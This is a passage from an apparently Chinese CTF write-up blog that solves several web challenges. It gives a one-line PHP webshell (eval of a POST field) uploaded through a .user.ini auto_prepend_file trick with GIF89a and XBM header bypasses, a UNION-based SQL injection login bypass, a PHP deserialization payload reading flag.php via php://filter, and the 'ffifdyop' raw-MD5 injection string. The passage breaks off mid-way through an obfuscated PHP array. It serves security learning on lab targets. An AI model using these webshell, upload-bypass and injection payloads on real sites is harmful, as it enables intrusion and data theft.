src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220222210628.png" alt="QQ截图20220222210628"></p><p>过滤了 <strong>&lt;?</strong><br>然后可以上传图像类型的文件。<br>这里就让我想到了上传.htacess，但是文章中也是过滤掉了。<br>(这里就走头无路了，看看wp，提示到apache是可以用.htacess，而这里用的服务器niginx)</p><p>优势：跟<code>.htaccess</code>后门比，适用范围更广，nginx&#x2F;apache&#x2F;IIS都有效，而<code>.htaccess</code>只适用于apache</p><h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220222211627.png" alt="QQ截图20220222211627"></p><p>也就是说我们可以在<code>.user.ini</code>中设置<code>php.ini</code>中<strong>PHP_INI_PERDIR</strong> 和 <strong>PHP_INI_USER</strong> 模式的 INI 设置，而且只要是在使用 <strong>CGI／FastCGI</strong> 模式的服务器上都可以使用<code>.user.ini</code></p><p>在p牛的文章中提到了两个有趣的设置：<strong>auto_prepend_file</strong>和<strong>auto_append_file</strong></p><p>我们再到手册中看了下这两个设置的定义：</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220222212237.png" alt="QQ截图20220222212237"></p><p>大致意思就是：我们指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：<code>require(./a.jpg);</code>（这里就是为什么要写入跟上传文件的图片一个命名的原因。）</p><p>这两个设置的区别只是在于<strong>auto_prepend_file</strong>是在文件前插入；<strong>auto_append_file</strong>在文件最后插入（当文件调用的有<code>exit()</code>时该设置无效）。</p><h3 id="解题步骤（方法一）"><a href="#解题步骤（方法一）" class="headerlink" title="解题步骤（方法一）"></a>解题步骤（方法一）</h3><p>1、上传.user.ini</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><span class="hljs-attribute">auto_prepend_file</span>=a.jpg<br></code></pre></td></tr></table></figure><p>2、上传a.jpg</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">GIF89a<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;a&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>3、访问上传的文件路径。<strong>upload&#x2F;md5(*)</strong><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220222212917.png" alt="QQ截图20220222212917"></p><p>得到flag。</p><h3 id="绕过exif-imagetype-的奇技淫巧（解题方法二）"><a href="#绕过exif-imagetype-的奇技淫巧（解题方法二）" class="headerlink" title="绕过exif_imagetype()的奇技淫巧（解题方法二）"></a>绕过<code>exif_imagetype()</code>的奇技淫巧（解题方法二）</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> width 20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> height 10</span><br></code></pre></td></tr></table></figure><p>采用xbm格式X Bit Map，绕过exif_imagetype()方法的检测，上传文件来解析。<br> 在计算机图形学中，X Window系统使用X BitMap，一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图。<br> XBM数据由一系列包含单色像素数据的静态无符号字符数组组成，当格式被普遍使用时，XBM通常出现在标题.h文件中，每个图像在标题中存储一个数组。<br> 也就是用c代码来标识一个xbm文件，前两个#defines指定位图的高度和宽度【以像素为单位，比如以下xbm文件：<br> <code>#define test_width 16</code><br> <code>#define test_height 7</code></p><p>只需将上述文件中的GIF89a改为 </p><p>#define width 20</p><p>#define height 10</p><p>即可。</p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>尝试很多次都是失败。然后突然发现。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220223162344.png" alt="QQ截图20220223162344"></p><p>这是一个什么编码呢？尝试许久不知道。查了查wp。是base32。然后是base64。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;$name&#x27;</span><br></code></pre></td></tr></table></figure><p>但是还是没有思路。因为根本绕不过。肯定还有别的校验。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;<br>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; <br>&lt;title&gt;Do you know who am I?&lt;/title&gt;<br>&lt;?php<br>require &quot;config.php&quot;;<br>require &quot;flag.php&quot;;<br><br>// 去除转义<br>if (get_magic_quotes_gpc()) &#123;<br>function stripslashes_deep($value)<br>&#123;<br>$value = is_array($value) ?<br>array_map(&#x27;stripslashes_deep&#x27;, $value) :<br>stripslashes($value);<br>return $value;<br>&#125;<br><br>$_POST = array_map(&#x27;stripslashes_deep&#x27;, $_POST);<br>$_GET = array_map(&#x27;stripslashes_deep&#x27;, $_GET);<br>$_COOKIE = array_map(&#x27;stripslashes_deep&#x27;, $_COOKIE);<br>$_REQUEST = array_map(&#x27;stripslashes_deep&#x27;, $_REQUEST);<br>&#125;<br><br>mysqli_query($con,&#x27;SET NAMES UTF8&#x27;);<br>$name = $_POST[&#x27;name&#x27;];<br>$password = $_POST[&#x27;pw&#x27;];<br>$t_pw = md5($password);<br>$sql = &quot;select * from user where username = &#x27;&quot;.$name.&quot;&#x27;&quot;;<br>// echo $sql;<br>$result = mysqli_query($con, $sql);<br><br><br>if(preg_match(&quot;/\(|\)|\=|or/&quot;, $name))&#123;<br>die(&quot;do not hack me!&quot;);<br>&#125;<br>else&#123;<br>if (!$result) &#123;<br>printf(&quot;Error: %s\n&quot;, mysqli_error($con));<br>exit();<br>&#125;<br>else&#123;<br>// echo &#x27;&lt;pre&gt;&#x27;;<br>$arr = mysqli_fetch_row($result);<br>// print_r($arr);<br>if($arr[1] == &quot;admin&quot;)&#123;<br>if(md5($password) == $arr[2])&#123;<br>echo $flag;<br>&#125;<br>else&#123;<br>die(&quot;wrong pass!&quot;);<br>&#125;<br>&#125;<br>else&#123;<br>die(&quot;wrong user!&quot;);<br>&#125;<br>&#125;<br>&#125;<br><br>?&gt;<br><br></code></pre></td></tr></table></figure><p>1、在name中过滤了一些字符以及or。</p><p>2、mysqli_query（）对数据库进行一次查询</p><p>3、mysqli_fetch_row() 函数从结果集中取得一行，并作为枚举数组返回。<br>4、md5加密后要与数组arr[2]弱类型比较。</p><p>5、值得注意的一点<code>$result = mysqli_query($con, $sql);</code>这里必须是有一个sql的查询语句，不然会直接退出（由下方判断得出）。</p><p>6、这里不是很能理解sql语句<code>$sql = &quot;select * from user where username = &#39;&quot;.$name.&quot;&#39;&quot;;</code>,拼接进去到底是什么样子的。询问了h3师傅。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220223170735.png" alt="QQ截图20220223170735"></p><p><strong><code>大爱h3</code></strong></p><p>尴尬，被教训了。我自己动手，设置的变量没有加<code>&quot;&quot;</code>,被骂的妥妥的，错了错了下次一定还敢哈哈哈哈。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220223171831.png" alt="QQ截图20220223171831"></p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>1、<code>name=ad&#39; union select 1,&#39;admin&#39;,NULL#&amp;pw[]=123</code></p><p>2、<code>name=ad&#39; union select 1,&#39;admin&#39;,&#39;加密后的md5&#39;#&amp;pw[]=任意待MD5加密的密码</code>（本人没有复现成功，没有具体的数据库也不能跟进查看）。</p><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML"> &lt;?php<br><br>include(&quot;flag.php&quot;);<br><br>highlight_file(__FILE__);<br><br>class FileHandler &#123;<br><br>    protected $op;<br>    protected $filename;<br>    protected $content;<br><br>    function __construct() &#123;<br>        $op = &quot;1&quot;;<br>        $filename = &quot;/tmp/tmpfile&quot;;<br>        $content = &quot;Hello World!&quot;;<br>        $this-&gt;process();<br>    &#125;<br><br>    public function process() &#123;<br>        if($this-&gt;op == &quot;1&quot;) &#123;<br>            $this-&gt;write();<br>        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;<br>            $res = $this-&gt;read();<br>            $this-&gt;output($res);<br>        &#125; else &#123;<br>            $this-&gt;output(&quot;Bad Hacker!&quot;);<br>        &#125;<br>    &#125;<br><br>    private function write() &#123;<br>        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;<br>            if(strlen((string)$this-&gt;content) &gt; 100) &#123;<br>                $this-&gt;output(&quot;Too long!&quot;);<br>                die();<br>            &#125;<br>            $res = file_put_contents($this-&gt;filename, $this-&gt;content);<br>            if($res) $this-&gt;output(&quot;Successful!&quot;);<br>            else $this-&gt;output(&quot;Failed!&quot;);<br>        &#125; else &#123;<br>            $this-&gt;output(&quot;Failed!&quot;);<br>        &#125;<br>    &#125;<br><br>    private function read() &#123;<br>        $res = &quot;&quot;;<br>        if(isset($this-&gt;filename)) &#123;<br>            $res = file_get_contents($this-&gt;filename);<br>        &#125;<br>        return $res;<br>    &#125;<br><br>    private function output($s) &#123;<br>        echo &quot;[Result]: &lt;br&gt;&quot;;<br>        echo $s;<br>    &#125;<br><br>    function __destruct() &#123;<br>        if($this-&gt;op === &quot;2&quot;)<br>            $this-&gt;op = &quot;1&quot;;<br>        $this-&gt;content = &quot;&quot;;<br>        $this-&gt;process();<br>    &#125;<br><br>&#125;<br><br>function is_valid($s) &#123;<br>    for($i = 0; $i &lt; strlen($s); $i++)<br>        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))<br>            return false;<br>    return true;<br>&#125;<br><br>if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;<br><br>    $str = (string)$_GET[&#x27;str&#x27;];<br>    if(is_valid($str)) &#123;<br>        $obj = unserialize($str);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h3><p>一眼看到<code>unserialize</code>（大体就是考查反序列化了），然后有一个判断。<code>is_valid($str)</code>,上网找了半天，结果这是一个自建函数。emmm…无语啦。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-comment">#其功能就是限制输入的字符长度为32-125（转化为ascii后）</span><br></code></pre></td></tr></table></figure><p>然后想到魔法函数的调用。这里直接引用h3师傅的文章。copy过来。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">__destruct()：<span class="hljs-regexp">//</span>析构函数当对象被销毁时会被自动调用<br>__wakeup(): <span class="hljs-regexp">//u</span>nserialize()时会被自动调用<br>__invoke(): <span class="hljs-regexp">//</span>当尝试以调用函数的方法调用一个对象时，会被自动调用<br>__call(): <span class="hljs-regexp">//</span>在对象上下文中调用不可访问的方法时触发<br>__callStatci(): <span class="hljs-regexp">//</span>在静态上下文中调用不可访问的方法时触发<br>__get(): <span class="hljs-regexp">//</span>用于从不可访问的属性读取数据<br>__set(): <span class="hljs-regexp">//</span>用于将数据写入不可访问的属性<br>__isset(): <span class="hljs-regexp">//</span>在不可访问的属性上调用isset()或empty()触发<br>__unset(): <span class="hljs-regexp">//</span>在不可访问的属性上使用unset()时触发<br>__toString(): <span class="hljs-regexp">//</span>把类当作字符串使用时触发<br>__construct(): <span class="hljs-regexp">//</span>构造函数，当对象new的时候会自动调用，但在unserialize()时不会自动调用<br>__sleep(): <span class="hljs-regexp">//</span>serialize()函数会检查类中是否存在一个魔术方法__sleep() 如果存在，该方法会被优先调用<br></code></pre></td></tr></table></figure><p>这里就可以直接看看<code>_destruct()</code>干了什么。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><span class="hljs-comment">#op初始值为1</span><br></code></pre></td></tr></table></figure><p>继续跟<code>process()</code>函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>     <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>         <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>     &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>         <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>         <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>     &#125; <span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>     &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>很显然需要进入<code>read()</code>函数。这里<code>output</code>，会将返回结果输出。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable language_">$this</span>-&gt;filename);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>很显然这里就可以用php:&#x2F;&#x2F;filter伪协议读取文件。</p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>1、需要在进入<code>process</code>之前将op的值改为2。</p><p>2、构造filenaem&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220223160637.png" alt="QQ截图20220223160637"></p><p>这里不知道什么原因。搜了一下wp。看wp的时候发现自己的伪协议写错了。emmm…手动添加<code>//</code>，并且手动改变wp。<code>55</code>–<code>57</code></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220223160814.png" alt="QQ截图20220223160814"></p><h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;s:<span class="hljs-number">57</span>:<span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><h3 id="Base64解码"><a href="#Base64解码" class="headerlink" title="Base64解码"></a>Base64解码</h3><p>结束。</p><h2 id="SWPUCTF-2016-Web7"><a href="#SWPUCTF-2016-Web7" class="headerlink" title="[SWPUCTF 2016]Web7"></a>[SWPUCTF 2016]Web7</h2><p>这题相对来说就比较简单。简单记录一下。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220218183715.png" alt="QQ截图20220218183715"></p><p>如何绕过呢？百度一瞧。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220218183842.png" alt="QQ截图20220218183842"></p><p><strong>师傅已经讲得很详细了，总而言之就是当注入的pass&#x3D;ffifdyop时，ffifdyop经过md5加密后变成 ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c 被返回， ‘ \ ‘后面的3个字符连同’ \ ‘算一个字符，比如’  \xc9 ‘，所以上述一共16个字符。函数md5($pass,true)返回为true。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220218184141.png" alt="QQ截图20220218184141"></p><p>查看源码 MD5简单绕过，然后依旧MD5简单绕过。<br>结束。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220218184328.png" alt="QQ截图20220218184328"></p><h2 id="FlareOn1-Javascrap"><a href="#FlareOn1-Javascrap" class="headerlink" title="[FlareOn1]Javascrap"></a>[FlareOn1]Javascrap</h2><p>给了压缩包直接下载一下。winhex查看图片。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$terms</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;z&quot;</span>, <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;)&quot;</span>, <span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;\&#x27;&quot;</span>, <span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;`&quot;</span>, <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;&#123;&quot;</span>, <span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;|&quot;</span>);<br><span class="hljs-variable">$order</span>=<span class="hljs-keyword">array</span>(<span class="hljs-number">59</span>, <span class="hljs-number">71</span>, <span class="hljs-number">73</span>, <span class="hljs-number">13</span>, <span class="hljs-number">35</span>, <span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">81</span>, <span class="hljs-number">76</span>, <span class="hljs-number">10</span>, <span class="hljs-number">28</span>, <span class="hljs-number">63</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">28</span>, <span class="hljs-number">11</span>, <span class="hljs-number">76</span>, <span class="hljs-number">68</span>, <span class="hljs-number">50</span>, 